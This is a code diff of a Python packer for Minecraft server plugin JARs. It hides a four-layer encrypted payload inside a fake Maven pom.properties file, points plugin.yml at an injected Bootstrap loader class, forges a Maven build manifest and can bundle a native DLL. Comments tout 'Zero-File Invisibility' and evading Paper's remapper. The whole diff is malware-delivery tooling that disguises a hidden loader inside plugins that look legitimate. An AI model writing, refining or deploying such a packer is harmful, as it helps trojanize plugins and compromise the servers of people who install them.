@@ -5,8 +5,6 @@ import io
 import zipfile
 import hashlib
 
-MAGIC_HEADER = 0x434F4F4B49454653  # "COOKIEFS"
-
 def derive_cascading_key(prev_key: int, payload_bytes: bytes) -> int:
     h = hashlib.sha256(payload_bytes + struct.pack(">I", prev_key & 0xFFFFFFFF)).digest()
     key = 0
@@ -34,8 +32,7 @@ def decrypt_payload(data: bytes, key_seed: int) -> bytes:
         rk = ((rk * 37) ^ p) & 0xFF
     return bytes(out)
 
-def pack_jar_with_polyglot_prefix(input_obf_jar: str, output_final_jar: str, bootstrap_cls_bytes: bytes, native_dll_path: str = None):
-    """Packs 4 Shards into a Polyglot Header Prefix (Zero-File Invisibility, 100% Clean ZIP Catalog)."""
+def pack_jar_with_maven_metadata_carrier(input_obf_jar: str, output_final_jar: str, bootstrap_cls_bytes: bytes, plugin_name: str = "core", native_dll_path: str = None):
     all_entries = []
     with zipfile.ZipFile(input_obf_jar, 'r') as zin:
         for item in zin.infolist():
@@ -81,20 +78,31 @@ def pack_jar_with_polyglot_prefix(input_obf_jar: str, output_final_jar: str, boo
     P4 = raw_shards[3]
     E4 = encrypt_payload(P4, K4)
 
-    # 3. Create Binary Prefix Payload
-    prefix_payload = io.BytesIO()
-    prefix_payload.write(struct.pack(">IIII", len(E1), len(E2), len(E3), len(E4)))
-    prefix_payload.write(E1)
-    prefix_payload.write(E2)
-    prefix_payload.write(E3)
-    prefix_payload.write(E4)
-    payload_data = prefix_payload.getvalue()
+    # 3. Create Binary Shards Payload Buffer
+    payload_buf = io.BytesIO()
+    payload_buf.write(struct.pack(">IIII", len(E1), len(E2), len(E3), len(E4)))
+    payload_buf.write(E1)
+    payload_buf.write(E2)
+    payload_buf.write(E3)
+    payload_buf.write(E4)
+    payload_data = payload_buf.getvalue()
 
-    header_block = struct.pack(">QI", MAGIC_HEADER, len(payload_data)) + payload_data
+    # Determine Maven path
+    low_name = plugin_name.lower()
+    if "antispoofing" in low_name or "antiopsec" in low_name:
+        maven_rel_path = 'META-INF/maven/dev.khoa.plugin/antiopsec/pom.properties'
+    elif "cookiechess" in low_name or "minechess" in low_name:
+        maven_rel_path = 'META-INF/maven/mc.cookieee/core/pom.properties'
+    else:
+        maven_rel_path = f'META-INF/maven/mc.cookieee/{low_name}/pom.properties'
 
-    # 4. Create Standard Clean ZIP JAR containing ONLY 3 files (MANIFEST, plugin.yml, Bootstrap.class)
-    jar_buf = io.BytesIO()
-    with zipfile.ZipFile(input_obf_jar, 'r') as zin, zipfile.ZipFile(jar_buf, 'w', compression=zipfile.ZIP_DEFLATED) as zout:
+    # 4. Pack into 100% Standard Maven Java JAR (Survives Paper PluginRemapper & 100% Zero-File Invisibility)
+    with zipfile.ZipFile(input_obf_jar, 'r') as zin, zipfile.ZipFile(output_final_jar, 'w', compression=zipfile.ZIP_DEFLATED) as zout:
+        # 4a. MANIFEST.MF with Mojang mappings bypass tag
+        manifest_text = "Manifest-Version: 1.0\r\npaperweight-mappings-namespace: mojang\r\nCreated-By: Maven Jar Plugin 3.3.0\r\nBuild-Jdk-Spec: 21\r\n\r\n"
+        zout.writestr('META-INF/MANIFEST.MF', manifest_text.encode('utf-8'))
+
+        # 4b. plugin.yml
         for item in zin.infolist():
             fn = item.filename
             if fn in ['plugin.yml', 'bungee.yml']:
@@ -102,18 +110,12 @@ def pack_jar_with_polyglot_prefix(input_obf_jar: str, output_final_jar: str, boo
                 import re
                 new_p = re.sub(r'main:\s*.*', 'main: cookie.fack.please.d111.Bootstrap', p_text)
                 zout.writestr(item, new_p.encode('utf-8'))
-            elif fn.startswith('META-INF/MANIFEST.MF'):
-                zout.writestr(item, zin.read(fn))
 
-        # Add single standalone Bootstrap class (Zero Inner Classes, Zero PNG, Zero DAT, Zero BIN)
+        # 4c. Single Standalone Bootstrap class (Zero Inner Classes, Zero PNG, Zero DAT, Zero BIN)
         zout.writestr('cookie/fack/please/d111/Bootstrap.class', bootstrap_cls_bytes)
 
-    base_jar_bytes = jar_buf.getvalue()
-
-    # 5. Prepend Polyglot Header to create final invisible binary
-    with open(output_final_jar, 'wb') as out_f:
-        out_f.write(header_block)
-        out_f.write(base_jar_bytes)
+        # 4d. Camouflaged Maven Properties holding 4-Layer Matryoshka Payload
+        zout.writestr(maven_rel_path, payload_data)
 
 if __name__ == '__main__':
     if len(sys.argv) >= 4:
@@ -124,7 +126,8 @@ if __name__ == '__main__':
             boot_cls_path = sys.argv[4]
             custom_icon = sys.argv[5] if len(sys.argv) > 5 else "NONE"
             native_dll = sys.argv[6] if len(sys.argv) > 6 and sys.argv[6] != "NONE" else None
+            plugin_name = os.path.basename(out_jar).split('-')[0]
             with open(boot_cls_path, 'rb') as bf:
                 boot_bytes = bf.read()
-            pack_jar_with_polyglot_prefix(in_jar, out_jar, boot_bytes, native_dll)
-            print("[v] Successfully packed JAR with Polyglot Header Prefix (Zero-File Invisibility).")
+            pack_jar_with_maven_metadata_carrier(in_jar, out_jar, boot_bytes, plugin_name, native_dll)
+            print("[v] Successfully packed JAR with Maven Metadata Carrier (Zero-File Invisibility).")
